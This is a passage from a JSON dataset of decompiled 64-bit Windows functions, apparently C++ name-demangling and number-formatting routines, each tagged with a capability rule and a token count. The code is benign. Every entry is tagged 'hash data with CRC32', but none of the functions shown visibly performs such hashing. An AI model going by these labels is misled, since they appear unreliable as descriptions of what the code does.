1) != 0) {\n        pcStack296 = \"extern \\\"C\\\" \";\n        uStack288 = 0xb;\n        uVar3 = fcn.1800092a8(auStack248, &pcStack296);\n        fcn.1800097fc(uVar3, &pcStack296, &pcStack280);\n        pcStack280 = pcStack296;\n        uVar7 = uStack288;\n    }\ncode_r0x00018000aa7b:\n    *arg1 = pcStack280;\n    *(arg1 + 1) = uVar7;\n    return arg1;\n}\n",
        "token_count": 5854
    },
    "18000ae2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong * fcn.18000ae2c(ulong *arg1)\n\n{\n    ulong var_20h;\n    ulong var_18h;\n    char *var_10h;\n    ulong var_bp_8h;\n    \n    if (**0x1800914b8 == 'X') {\n        var_bp_8h._0_4_ = 4;\n        var_10h = \"void\";\n    }\n    else {\n        if (**0x1800914b8 != 'Z') {\n            fcn.18000ac78(&var_20h);\n            if ((var_18h == '\\0') && (**0x1800914b8 != '\\0')) {\n                if (**0x1800914b8 != '@') {\n                    if (**0x1800914b8 != 'Z') {\n                        *(arg1 + 1) = 0;\n                        *(arg1 + 1) = 2;\n                        *arg1 = 0;\n                        return arg1;\n                    }\n                    *0x1800914b8 = *0x1800914b8 + 1;\n                    if ((~(*0x1800914c8 >> 0x12) & 1) == 0) {\n                        var_10h = \",<ellipsis>\";\n                        var_bp_8h._0_4_ = 0xb;\n                    }\n                    else {\n                        var_10h = \",...\";\n                        var_bp_8h._0_4_ = 4;\n                    }\n                    fcn.1800097d0(&var_20h, arg1, &var_10h);\n                    return arg1;\n                }\n                *0x1800914b8 = *0x1800914b8 + 1;\n            }\n            *arg1 = var_20h;\n            *(arg1 + 1) = var_18h;\n            return arg1;\n        }\n        if ((~(*0x1800914c8 >> 0x12) & 1) == 0) {\n            var_10h = \"<ellipsis>\";\n            var_bp_8h._0_4_ = 10;\n        }\n        else {\n            var_10h = 0x18004714c;\n            var_bp_8h._0_4_ = 3;\n        }\n    }\n    *0x1800914b8 = *0x1800914b8 + 1;\n    fcn.1800092a8(arg1, &var_10h);\n    return arg1;\n}\n",
        "token_count": 551
    },
    "18000b41": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_10h\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** fcn.18000b410(char **arg1, int64_t *arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    char **ppcVar4;\n    ulong *arg1_00;\n    ulong arg1_01;\n    uint32_t uVar5;\n    char *arg2_00;\n    ulong uVar6;\n    uint8_t uVar7;\n    char *pcStack88;\n    uint uStack80;\n    char *var_40h;\n    ulong var_38h;\n    char *var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_bp_18h;\n    ulong var_bp_10h;\n    uint8_t uVar8;\n    uint8_t uVar9;\n    \n    uVar2 = **0x1800914b8;\n    uVar5 = uVar2;\n    if (uVar2 == 0) {\n        var_28h._0_4_ = 0;\n        var_30h = 0x180047780;\n        arg1_00 = &var_30h;\ncode_r0x00018000b9e9:\n        fcn.1800097fc(arg1_00, arg1, arg2);\n        return arg1;\n    }\n    pcStack88 = NULL;\n    puVar1 = *0x1800914b8 + 1;\n    uVar9 = 0;\n    uVar8 = 0;\n    uVar7 = 0;\n    uStack80 = 0;\n    puVar3 = *0x1800914b8;\n    if (uVar2 < 0x59) {\n        if (uVar2 == 0x58) {\n            uVar6 = 4;\n            arg2_00 = \"void\";\n            uVar7 = uVar9;\n            *0x1800914b8 = puVar1;\n        }\n        else if (uVar5 < 0x4c) {\n            if (uVar5 == 0x4b) {\ncode_r0x00018000b4a5:\n                uVar6 = 4;\n                arg2_00 = \"long\";\n                uVar7 = uVar9;\n                *0x1800914b8 = puVar1;\n            }\n            else if (((uVar5 == 0x43) || (uVar5 == 0x44)) || (uVar5 == 0x45)) {\n                uVar6 = 4;\n                arg2_00 = \"char\";\n                uVar7 = uVar9;\n                *0x1800914b8 = puVar1;\n            }\n            else if ((uVar5 == 0x46) || (uVar5 == 0x47)) {\n                uVar6 = 5;\n                arg2_00 = \"short\";\n                uVar7 = uVar9;\n                *0x1800914b8 = puVar1;\n            }\n            else {\n                if ((uVar5 != 0x48) && (uVar5 != 0x49)) {\n                    uVar7 = uVar8;\n                    if (uVar5 != 0x4a) goto code_r0x00018000b591;\n                    goto code_r0x00018000b4a5;\n                }\n                uVar6 = 3;\n                arg2_00 = 0x1800473e8;\n                uVar7 = uVar9;\n                *0x1800914b8 = puVar1;\n            }\n        }\n        else {\n            if (uVar5 != 0x4d) {\n                if (uVar5 != 0x4e) {\n                    if (uVar5 != 0x4f) {\n                        if ((((uVar5 == 0x50) || (uVar5 == 0x51)) || (uVar5 == 0x52)) || (uVar7 = uVar8,  uVar5 == 0x53)\n                           ) {\n                            uVar5 = uVar5 & 3;\n                            *0x1800914b8 = puVar1;\n                            goto code_r0x00018000b758;\n                        }\n                        goto code_r0x00018000b591;\n                    }\n                    *0x1800914b8 = puVar1;\n                    fcn.180008f88(&pcStack88, \"long \", 5);\n                    puVar1 = *0x1800914b8;\n                }\n                *0x1800914b8 = puVar1;\n                var_30h = \"double\";\n                var_28h._0_4_ = 6;\n                fcn.1800098c4(&pcStack88, &var_30h);\n                goto code_r0x00018000b917;\n            }\n            uVar6 = 5;\n            arg2_00 = \"float\";\n            uVar7 = uVar9;\n            *0x1800914b8 = puVar1;\n        }\ncode_r0x00018000b90e:\n        fcn.180008f88(&pcStack88, arg2_00, uVar6);\n    }\n    else {\n        uVar7 = uVar8;\n        if (uVar5 == 0x5f) {\n            uVar7 = *puVar1;\n            *0x1800914b8 = *0x1800914b8 + 2;\n            if (uVar7 < 0x4f) {\n                if (uVar7 == 0x4e) {\n                    uVar6 = 4;\n                    arg2_00 = \"bool\";\n                }\n                else if (uVar7 < 0x49) {\n                    if (uVar7 == 0x48) {\ncode_r0x00018000b6c7:\n                        uVar6 = 7;\n                        arg2_00 = \"__int32\";\n                    }\n                    else {\n                        if (uVar7 == 0) {\n                            *0x1800914b8 = puVar1;\n                            fcn.180009694(&pcStack88, 1);\n                            goto code_r0x00018000b917;\n                        }\n                        if (uVar7 == 0x24) {\n                            var_30h = \"__w64 \";\n                            var_28h._0_4_ = 6;\n                            arg2 = fcn.18000b410(&var_40h, arg2);\n                            arg1_00 = fcn.1800092a8(&pcStack88, &var_30h);\n                            goto code_r0x00018000b9e9;\n                        }\n                        if ((uVar7 == 0x44) || (uVar7 == 0x45)) {\n                            uVar6 = 6;\n                            arg2_00 = \"__int8\";\n                        }\n                        else {\n                            if ((uVar7 != 0x46) && (uVar7 != 0x47)) goto code_r0x00018000b885;\n                            uVar6 = 7;\n                            arg2_00 = \"__int16\";\n                        }\n                    }\n                }\n                else {\n                    if (uVar7 == 0x49) goto code_r0x00018000b6c7;\n                    if ((uVar7 == 0x4a) || (uVar7 == 0x4b)) {\n                        uVar6 = 7;\n                        arg2_00 = \"__int64\";\n                    }\n                    else {\n                        if ((uVar7 == 0x4c) || (uVar7 == 0x4d)) {\n                            arg2_00 = \"__int128\";\n                            goto code_r0x00018000b908;\n                        }\ncode_r0x00018000b885:\n                        uVar6 = 7;\n                        arg2_00 = \"UNKNOWN\";\n                    }\n                }\n            }\n            else if (uVar7 < 0x55) {\n                if (uVar7 == 0x54) {\n                    uVar6 = 0xe;\n                    arg2_00 = \"decltype(auto)\";\n                }\n                else {\n                    if (uVar7 == 0x4f) {\n                        uVar5 = 0xfffffffe;\ncode_r0x00018000b758:\n                        var_30h = *arg2;\n                        var_28h._0_4_ = *(arg2 + 1);\n                        pcStack88 = NULL;\n                        uStack80 = 0;\n                        if (uVar5 == 0xfffffffe) {\n                            var_28h._0_4_ = var_28h | 0x800;\n                            fcn.18000ea94(&var_40h, &pcStack88, &var_30h, 0);\n                            if ((var_38h & 0x800) == 0) {\n                                var_30h = 0x180046b00;\n                                var_28h._0_4_ = 2;\n                                fcn.1800098c4(&var_40h, &var_30h);\n                            }\n                            *arg1 = var_40h;\n                            *(arg1 + 1) = var_38h;\n                            return arg1;\n                        }\n                        if (var_30h == NULL) {\n                            if ((uVar5 & 1) == 0) {\n                                if ((uVar5 & 2) != 0) {\n                                    fcn.180008f88(&pcStack88, \"volatile\", 8);\n                                }\n                            }\n                            else {\n                                fcn.180008f88(&pcStack88, \"const\", 5);\n                                if ((uVar5 & 2) != 0) {\n                                    var_40h = \" volatile\";\n                                    var_38h._0_4_ = 9;\n                                    fcn.1800098c4(&pcStack88, &var_40h);\n                                }\n                            }\n                        }\n                        fcn.18000ea94(arg1, &pcStack88, &var_30h, 1);\n                        return arg1;\n                    }\n                    if (uVar7 == 0x50) {\n                        uVar6 = 4;\n                        arg2_00 = \"auto\";\n                    }\n                    else if (uVar7 == 0x51) {\n                        uVar6 = 7;\n                        arg2_00 = \"char8_t\";\n                    }\n                    else {\n                        if (uVar7 != 0x52) {\n                            if (uVar7 != 0x53) goto code_r0x00018000b885;\n                            arg2_00 = \"char16_t\";\n                            goto code_r0x00018000b908;\n                        }\n                        uVar6 = 9;\n                        arg2_00 = \"<unknown>\";\n                    }\n                }\n            }\n            else if (uVar7 == 0x55) {\n                arg2_00 = \"char32_t\";\ncode_r0x00018000b908:\n                uVar6 = 8;\n            }\n            else {\n                if (uVar7 == 0x56) {\n                    var_30h = \"this \";\n                    var_28h._0_4_ = 5;\n                    uVar6 = fcn.18000e610(&var_40h, arg2);\n                    arg1_01 = fcn.1800092a8(&var_20h, &var_30h);\n                    fcn.1800097fc(arg1_01, &var_30h, uVar6);\n                    pcStack88 = var_30h;\n                    uStack80 = var_28h;\n                    goto code_r0x00018000b917;\n                }\n                if (uVar7 != 0x57) {\n                    puVar3 = puVar1;\n                    if ((uVar7 != 0x58) && (uVar7 != 0x59)) goto code_r0x00018000b885;\n                    goto code_r0x00018000b591;\n                }\n                uVar6 = 7;\n                arg2_00 = \"wchar_t\";\n            }\n            goto code_r0x00018000b90e;\n        }\ncode_r0x00018000b591:\n        *0x1800914b8 = puVar3;\n        ppcVar4 = fcn.18000cb4c(&var_30h);\n        pcStack88 = *ppcVar4;\n        uStack80 = *(ppcVar4 + 1);\n        if (pcStack88 == NULL) {\n            *arg1 = NULL;\n            *(arg1 + 1) = uStack80;\n            return arg1;\n        }\n    }\ncode_r0x00018000b917:\n    if (uVar2 == 0x43) {\n        var_30h = \"signed \";\n        var_28h._0_4_ = 7;\n    }\n    else {\n        if (((uVar5 - 0x45 & 0xf9) != 0) && (((uVar2 != 0x5f || (8 < uVar7 + 0xbb)) || ((uVar7 + 0xbb & 1) != 0))))\n        goto code_r0x00018000b991;\n        var_30h = \"unsigned \";\n        var_28h._0_4_ = 9;\n    }\n    uVar6 = fcn.1800092a8(&var_20h, &var_30h);\n    fcn.1800097fc(uVar6, &var_30h, &pcStack88);\n    pcStack88 = var_30h;\n    uStack80 = var_28h;\ncode_r0x00018000b991:\n    if (*arg2 != 0) {\n        var_30h = NULL;\n        var_28h._0_4_ = 0;\n        fcn.18000ab3c(&var_30h);\n        fcn.1800097fc(&var_30h, &var_40h, arg2);\n        fcn.180009944(&pcStack88, &var_40h);\n    }\n    *arg1 = pcStack88;\n    *(arg1 + 1) = uStack80;\n    return arg1;\n}\n",
        "token_count": 3124
    },
    "18000bb4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nulong * fcn.18000bb4c(ulong *arg1)\n\n{\n    char cVar1;\n    ulong *puVar2;\n    uint32_t uVar3;\n    ulong arg2;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_bp_10h;\n    \n    if (**0x1800914b8 == '\\0') {\n        *(arg1 + 1) = 0;\n        *arg1 = 0x180047780;\n        return arg1;\n    }\n    cVar1 = **0x1800914b8;\n    *0x1800914b8 = *0x1800914b8 + 1;\n    if (0x16 < cVar1 - 0x41U) {\n        *(arg1 + 1) = 0;\n        *(arg1 + 1) = 2;\n        *arg1 = 0;\n        return arg1;\n    }\n    var_18h._0_4_ = 2;\n    var_20h = 0;\n    if ((~(*0x1800914c8 >> 1) & 1) != 0) {\n        uVar3 = cVar1 - 0x41U & 0xfffffffe;\n        if (uVar3 < 0xd) {\n            if (uVar3 == 0xc) {\n                arg2 = 7;\n            }\n            else if (uVar3 == 0) {\n                arg2 = 1;\n            }\n            else if (uVar3 == 2) {\n                arg2 = 2;\n            }\n            else if (uVar3 == 4) {\n                arg2 = 4;\n            }\n            else if (uVar3 == 6) {\n                arg2 = 3;\n            }\n            else {\n                if (uVar3 != 8) goto code_r0x00018000bc5c;\n                arg2 = 5;\n            }\n        }\n        else if (uVar3 == 0xe) {\n            arg2 = 8;\n        }\n        else if (uVar3 == 0x10) {\n            arg2 = 6;\n        }\n        else if (uVar3 == 0x12) {\n            arg2 = 9;\n        }\n        else if (uVar3 == 0x14) {\n            arg2 = 10;\n        }\n        else {\n            if (uVar3 != 0x16) goto code_r0x00018000bc5c;\n            arg2 = 0xb;\n        }\n        puVar2 = fcn.180009bc4(&var_bp_10h, arg2);\n        var_18h._0_4_ = 0;\n        fcn.180008f88(&var_20h, *puVar2, puVar2[1] & 0xffffffff);\n    }\ncode_r0x00018000bc5c:\n    *arg1 = var_20h;\n    *(arg1 + 1) = var_18h;\n    return arg1;\n}\n",
        "token_count": 674
    },
    "18000cb4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** fcn.18000cb4c(char **arg1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    ulong uVar3;\n    ulong arg1_00;\n    char *arg2;\n    char *var_50h;\n    ulong var_48h;\n    char *var_40h;\n    ulong var_38h;\n    char *var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_bp_10h;\n    \n    cVar1 = **0x1800914b8;\n    if (cVar1 == '\\0') {\n        var_38h._0_4_ = 0xe;\n        var_40h = \"`unknown ecsu\\'\";\n        var_30h = \"`unknown ecsu\\'\";\n        var_28h._0_4_ = 0xe;\n        uVar3 = fcn.1800092a8(&var_40h, &var_30h);\n        fcn.180009880(uVar3, arg1, 1);\n        return arg1;\n    }\n    var_40h = NULL;\n    var_38h._0_4_ = 0;\n    if (cVar1 == 'W') {\n        uVar2 = ~(*0x1800914c8 >> 0xf);\njoined_r0x00018000cc34:\n        if ((uVar2 & 1) == 0) {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            var_50h = NULL;\n            var_48h._0_4_ = 0;\n            if (cVar1 == 'T') {\n                arg2 = \"union \";\ncode_r0x00018000cd0a:\n                uVar3 = 6;\ncode_r0x00018000cd10:\n                fcn.180008f88(&var_50h, arg2, uVar3);\n            }\n            else {\n                if (cVar1 == 'U') {\n                    uVar3 = 7;\n                    arg2 = \"struct \";\n                    goto code_r0x00018000cd10;\n                }\n                if (cVar1 == 'V') {\n                    arg2 = \"class \";\n                    goto code_r0x00018000cd0a;\n                }\n                if (cVar1 != 'W') {\n                    if (cVar1 == 'X') {\n                        uVar3 = 8;\n                        arg2 = \"coclass \";\n                    }\n                    else {\n                        if (cVar1 != 'Y') goto code_r0x00018000cd19;\n                        uVar3 = 0xc;\n                        arg2 = \"cointerface \";\n                    }\n                    goto code_r0x00018000cd10;\n                }\n                var_30h = \"enum \";\n                var_28h._0_4_ = 5;\n                uVar3 = fcn.18000cd44(&var_20h);\n                arg1_00 = fcn.1800092a8(&var_bp_10h, &var_30h);\n                fcn.1800097fc(arg1_00, &var_30h, uVar3);\n                var_50h = var_30h;\n                var_48h._0_4_ = var_28h;\n            }\ncode_r0x00018000cd19:\n            var_40h = var_50h;\n            var_38h._0_4_ = var_48h;\n            goto code_r0x00018000cbe7;\n        }\n    }\n    else if ((~(*0x1800914c8 >> 0xf) & 1) != 0) {\n        uVar2 = *0x1800914c8 >> 0xc;\n        goto joined_r0x00018000cc34;\n    }\n    *0x1800914b8 = *0x1800914b8 + 1;\n    if (cVar1 == 'W') {\n        fcn.18000cd44(&var_bp_10h);\n    }\ncode_r0x00018000cbe7:\n    fcn.18000f350(&var_30h);\n    fcn.180009944(&var_40h, &var_30h);\n    *arg1 = var_40h;\n    *(arg1 + 1) = var_38h;\n    return arg1;\n}\n",
        "token_count": 972
    },
    "18000ec8": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint64_t * fcn.18000ec84(int64_t *arg1)\n\n{\n    char *pcVar1;\n    ulong *puVar2;\n    code **ppcVar3;\n    code **arg2;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    int64_t var_50h;\n    ulong var_48h;\n    ulong var_40h;\n    ulong var_38h;\n    ulong var_30h;\n    ulong var_28h;\n    ulong var_20h;\n    ulong var_18h;\n    ulong var_10h;\n    \n    arg2 = NULL;\n    if (((**0x1800914b8 == '_') && (pcVar1 = *0x1800914b8 + 1,  *pcVar1 != '\\0')) && (*pcVar1 < 'E')) {\n        uVar4 = *pcVar1 - 0x41;\n        *0x1800914b8 = *0x1800914b8 + 2;\n        if (uVar4 < 4) {\n            var_50h = 0;\n            var_48h._0_4_ = 0;\n            if ((~(*0x1800914c8 >> 1) & 1) != 0) {\n                fcn.18000ab3c(&var_50h);\n                puVar2 = fcn.180009bc4(&var_10h, 0xf);\n                var_20h = *puVar2;\n                var_18h._0_4_ = *(puVar2 + 1);\n                var_18h._4_4_ = *(puVar2 + 0xc);\n                fcn.1800098c4(&var_50h, &var_20h);\n                if (uVar4 != 0) {\n                    while( true ) {\n                        uVar5 = -uVar4 & uVar4;\n                        if (uVar5 == 1) {\n                            var_28h._0_4_ = 3;\n                            var_30h = 0x1800473cc;\n                            var_30h._0_4_ = 0x800473cc;\n                            var_40h._0_4_ = var_30h;\n                            uVar6 = var_28h._4_4_;\n                        }\n                        else {\n                            if (uVar5 != 2) {\n                                *(arg1 + 1) = 0;\n                                *(arg1 + 1) = 2;\n                                *arg1 = 0;\n                                return arg1;\n                            }\n                            var_38h._0_4_ = 3;\n                            var_40h = 0x1800473d0;\n                            var_40h._0_4_ = 0x800473d0;\n                            uVar6 = var_38h._4_4_;\n                        }\n                        _var_10h = CONCAT412(uVar6, CONCAT48(3, CONCAT44(1, var_40h)));\n                        fcn.1800098c4(&var_50h, &var_10h);\n                        uVar4 = uVar4 & ~uVar5;\n                        if (uVar4 == 0) break;\n                        var_18h._0_4_ = 2;\n                        var_20h = 0x1800473d4;\n                        _var_10h = CONCAT412(var_18h._4_4_, CONCAT48(2, 0x1800473d4));\n                        fcn.1800098c4(&var_50h, &var_10h);\n                    }\n                }\n                if (var_48h < '\\x02') {\n                    if (var_50h == 0) {\n                        var_50h = 0;\n                        var_48h._0_4_ = 0;\n                        fcn.18000ab3c(&var_50h);\n                    }\n                    else {\n                        ppcVar3 = fcn.18000d95c(0x1800914e0, 0x10);\n                        if (ppcVar3 != NULL) {\n                            *(ppcVar3 + 1) = 0x29;\n                            *ppcVar3 = vtable.charNode.0;\n                            arg2 = ppcVar3;\n                        }\n                        fcn.180008f24(&var_50h, arg2);\n                    }\n                }\n            }\n            *arg1 = var_50h;\n            *(arg1 + 1) = var_48h;\n            return arg1;\n        }\n        *(arg1 + 1) = 0;\n        *(arg1 + 1) = 2;\n    }\n    else {\n        *(arg1 + 1) = 0;\n    }\n    *arg1 = 0;\n    return arg1;\n}\n",
        "token_count": 1064
    },
    "18001047": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.180010478(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    int32_t iVar8;\n    \n    while( true ) {\n        uVar1 = 0;\n        if (**0x1800914b8 == 0x5f) {\n            *0x1800914b8 = *0x1800914b8 + 1;\n            uVar1 = 0x4000;\n        }\n        uVar7 = **0x1800914b8;\n        iVar4 = uVar7;\n        if (uVar7 + 0xbf < 0x1a) {\n            uVar6 = iVar4 - 0x41;\n            *0x1800914b8 = *0x1800914b8 + 1;\n            uVar2 = uVar1 | 0xa000;\n            if ((uVar6 & 1) == 0) {\n                uVar2 = uVar1 | 0x8000;\n            }\n            if (0x17 < uVar6) {\n                return uVar2;\n            }\n            uVar3 = uVar2 | 0x800;\n            uVar1 = uVar6 & 0x18;\n            if (uVar1 == 0) {\n                uVar3 = uVar2 | 0x840;\n            }\n            else if (uVar1 == 8) {\n                uVar3 = uVar2 | 0x880;\n            }\n            else if (uVar1 != 0x10) {\n                return 0xffff;\n            }\n            uVar6 = uVar6 & 6;\n            if (uVar6 != 0) {\n                if (uVar6 == 2) {\n                    return uVar3 | 0x200;\n                }\n                if (uVar6 != 4) {\n                    if (uVar6 != 6) {\n                        return 0xffff;\n                    }\n                    return uVar3 | 0x400;\n                }\n                return uVar3 | 0x100;\n            }\n            return uVar3;\n        }\n        if (uVar7 != 0x24) {\n            if (8 < uVar7 - 0x30) {\n                if (uVar7 == 0x39) {\n                    *0x1800914b8 = *0x1800914b8 + 1;\n                    return 0xfffd;\n                }\n                if (uVar7 != 0x3b) {\n                    return (uVar7 != 0) + 0xfffe;\n                }\n                *0x1800914b8 = *0x1800914b8 + 1;\n                return 0x6c00;\n            }\n            *0x1800914b8 = *0x1800914b8 + 1;\n            if (iVar4 == 0x30) {\n                return 0x800;\n            }\n            if (iVar4 == 0x31) {\n                return 0x1000;\n            }\n            if (iVar4 == 0x32) {\n                return 0;\n            }\n            if (iVar4 == 0x33) {\n                return 0x4000;\n            }\n            if (iVar4 == 0x34) {\n                return 0x2000;\n            }\n            if (iVar4 != 0x35) {\n                if (iVar4 == 0x36) {\n                    return 0x6800;\n                }\n                if (iVar4 != 0x37) {\n                    if (iVar4 != 0x38) {\n                        return 0xffff;\n                    }\n                    return 0x7800;\n                }\n                return 0x7000;\n            }\n            return 0x6000;\n        }\n        puVar5 = *0x1800914b8 + 1;\n        uVar6 = *puVar5;\n        if (0x35 < uVar6) break;\n        iVar8 = 0;\n        iVar4 = 0;\n        if (uVar6 == 0x35) goto code_r0x000180010624;\n        if (*puVar5 == 0) {\n            uVar2 = 0xfffe;\n            goto code_r0x00018001069d;\n        }\n        if (uVar6 != 0x24) {\n            iVar4 = iVar8;\n            if ((((uVar6 != 0x30) && (uVar6 != 0x31)) && (uVar6 != 0x32)) && ((uVar6 != 0x33 && (uVar6 != 0x34)))) {\n                *0x1800914b8 = puVar5;\n                return 0xffff;\n            }\n            goto code_r0x000180010624;\n        }\n        if ((*0x1800914b8)[2] == 0x50) {\n            puVar5 = *0x1800914b8 + 2;\n        }\n        *0x1800914b8 = puVar5 + 1;\n        iVar4 = **0x1800914b8;\n        if (iVar4 < 0x4e) {\n            if (iVar4 != 0x4d) {\n                if (**0x1800914b8 == 0) {\n                    return 0xfffe;\n                }\n                if ((iVar4 - 0x46U & 0xfffffffd) != 0) {\n                    if (iVar4 == 0x4a) goto code_r0x000180010566;\n                    if (iVar4 != 0x4c) {\n                        return 0xffff;\n                    }\n                }\n            }\n        }\n        else {\n            if ((iVar4 == 0x4e) || (iVar4 == 0x4f)) {\ncode_r0x000180010566:\n                *0x1800914b8 = puVar5 + 2;\n                if (('/' < **0x1800914b8) && (**0x1800914b8 < ':')) {\n                    *0x1800914b8 = *0x1800914b8 + (**0x1800914b8 + -0x2f);\n                    uVar1 = fcn.180010478();\n                    return uVar1 | 0x10000;\n                }\n                uVar2 = 0xffff;\n                goto code_r0x00018001069d;\n            }\n            if (iVar4 != 0x51) {\n                if (iVar4 != 0x68) {\n                    return 0xffff;\n                }\n                *0x1800914d8 = 0;\n            }\n        }\n        *0x1800914b8 = puVar5 + 2;\n    }\n    if (uVar6 == 0x41) {\n        uVar2 = uVar1 | 0x9000;\n        *0x1800914b8 = puVar5;\n        goto code_r0x00018001069d;\n    }\n    if (uVar6 == 0x42) {\n        uVar2 = uVar1 | 0x9800;\n        *0x1800914b8 = puVar5;\n        goto code_r0x00018001069d;\n    }\n    if (uVar6 == 0x43) {\n        uVar2 = 0x7c00;\n        *0x1800914b8 = puVar5;\n        goto code_r0x00018001069d;\n    }\n    if (uVar6 == 0x44) {\n        uVar2 = uVar1 | 0x9100;\n        *0x1800914b8 = puVar5;\n        goto code_r0x00018001069d;\n    }\n    if (uVar6 == 0x45) {\n        uVar2 = uVar1 | 0x9200;\n        *0x1800914b8 = puVar5;\n        goto code_r0x00018001069d;\n    }\n    if (uVar6 != 0x52) {\n        *0x1800914b8 = puVar5;\n        return 0xffff;\n    }\n    puVar5 = *0x1800914b8 + 2;\n    uVar7 = *puVar5;\n    uVar6 = uVar7;\n    if ((uVar7 < '0') || (iVar4 = 1,  '5' < uVar7)) {\n        *0x1800914b8 = puVar5;\n        return 0xffff - (uVar7 != 0);\n    }\ncode_r0x000180010624:\n    *0x1800914b8 = puVar5;\n    uVar1 = (iVar4 + 5) * 0x100 | uVar1;\n    uVar2 = uVar1 | 0xa800;\n    if ((uVar6 & 1) == 0) {\n        uVar2 = uVar1 | 0x8800;\n    }\n    uVar7 = uVar6 & 6;\n    if ((uVar6 & 6) == 0) {\n        uVar2 = uVar2 | 0x40;\n    }\n    else if (uVar7 == 2) {\n        uVar2 = uVar2 | 0x80;\n    }\n    else if (uVar7 != 4) {\n        return 0xffff;\n    }\ncode_r0x00018001069d:\n    *0x1800914b8 = *0x1800914b8 + 1;\n    return uVar2;\n}\n",
        "token_count": 2133
    },
    "18002089": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint64_t fcn.180020890(int64_t arg1, ulong arg2)\n\n{\n    uint *puVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    \n    iVar3 = *(arg1 + 0x3c);\n    iVar5 = 8;\n    if (iVar3 < 6) {\n        if (iVar3 == 5) goto code_r0x0001800208df;\n        if (iVar3 != 0) {\n            if (iVar3 == 1) {\n                iVar5 = 1;\n                goto code_r0x0001800208df;\n            }\n            iVar3 = iVar3 + -2;\n            if (iVar3 == 0) {\n                iVar5 = 2;\n                goto code_r0x0001800208df;\n            }\n            goto code_r0x0001800208d2;\n        }\n    }\n    else {\n        if (((iVar3 == 6) || (iVar3 == 7)) || (iVar3 = iVar3 + -9,  iVar3 == 0)) goto code_r0x0001800208df;\ncode_r0x0001800208d2:\n        if (iVar3 != 1) {\n            if (iVar3 != 2) {\n                iVar5 = 0;\n            }\n            goto code_r0x0001800208df;\n        }\n    }\n    iVar5 = 4;\ncode_r0x0001800208df:\n    if (iVar5 == 1) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar5 == 2) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else if (iVar5 == 4) {\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        if ((*(arg1 + 0x30) >> 4 & 1) == 0) {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n        else {\n            uVar2 = *(*(arg1 + 0x20) + -8);\n        }\n    }\n    else {\n        if (iVar5 != 8) {\n            puVar1 = fcn.180023574();\n            *puVar1 = 0x16;\n            uVar2 = fcn.18001482c();\n            return uVar2 & 0xffffffffffffff00;\n        }\n        *(arg1 + 0x20) = *(arg1 + 0x20) + 8;\n        uVar2 = *(*(arg1 + 0x20) + -8);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 4 & 1) != 0) && (uVar2 < 0)) {\n        uVar2 = -uVar2;\n        uVar4 = uVar4 | 0x40;\n        *(arg1 + 0x30) = uVar4;\n    }\n    if (*(arg1 + 0x38) < 0) {\n        *(arg1 + 0x38) = 1;\n    }\n    else {\n        *(arg1 + 0x30) = uVar4 & 0xfffffff7;\n        fcn.1800183a8(arg1 + 0x58, *(arg1 + 0x38));\n    }\n    if (uVar2 == 0) {\n        *(arg1 + 0x30) = *(arg1 + 0x30) & 0xffffffdf;\n    }\n    *(arg1 + 0x54) = 0;\n    if (iVar5 == 8) {\n        fcn.180019984(arg1, uVar2, arg2);\n    }\n    else {\n        fcn.180019858(arg1, uVar2 & 0xffffffff, arg2);\n    }\n    uVar4 = *(arg1 + 0x30);\n    if (((uVar4 >> 7 & 1) != 0) && ((*(arg1 + 0x50) == 0 || (**(arg1 + 0x48) != '0')))) {\n        *(arg1 + 0x48) = *(arg1 + 0x48) + -1;\n        **(arg1 + 0x48) = 0x30;\n        *(arg1 + 0x50) = *(arg1 + 0x50) + 1;\n    }\n    return CONCAT71(uVar4 >> 0xf, 1);\n}\n",
        "token_count": 1175
    },
    "1800230c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
